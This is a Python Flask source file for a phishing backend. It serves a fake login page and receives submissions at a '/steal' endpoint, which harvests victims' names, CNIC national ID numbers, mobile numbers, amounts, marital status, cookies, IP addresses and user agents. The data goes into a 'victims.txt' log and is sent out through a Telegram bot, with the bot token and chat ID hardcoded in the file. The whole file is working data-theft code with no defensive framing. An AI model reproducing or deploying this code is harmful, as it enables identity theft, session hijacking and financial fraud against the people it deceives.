from flask import Flask, request, render_template
import os
from datetime import datetime
import requests
import json

app = Flask(__name__)

BOT_TOKEN = "7599021313:AAFmH8Ch1-KypyK0Ez2Ot-hYQ8TS7vcGLmE"
CHAT_ID = "6908281054"

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

@app.route('/')
def index():
    return render_template("login.html")

@app.route('/steal', methods=['POST'])
def steal():
    try:
        data = request.get_json()
        name = data.get("name", "Unknown")
        cnic = data.get("cnic", "Unknown")
        mobile = data.get("mobile", "Unknown")
        amount = data.get("amount", "Unknown")
        married = data.get("married", "Unknown")
        cookie = data.get("cookie", "None")
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        ua = request.headers.get("User-Agent", "Unknown")
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log = f"""[{time}]
IP: {ip}
UA: {ua}
👤 Name: {name}
🪪 CNIC: {cnic}
📱 Mobile: {mobile}
💸 Amount: {amount}
💍 Married: {married}
🍪 Cookies: {cookie}
{'='*50}
"""

        with open(os.path.join(LOG_DIR, "victims.txt"), "a") as f:
            f.write(log)

        tg_msg = f"""📥 نئی معلومات موصول:
🕓 {time}
🌐 IP: {ip}
👤 نام: {name}
🪪 CNIC: {cnic}
📱 Mobile: {mobile}
💸 Amount: {amount}
💍 Married: {married}
🍪 Cookie: {cookie}
"""
        send_telegram(tg_msg)

    except Exception as e:
        print(f"Error: {e}")
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
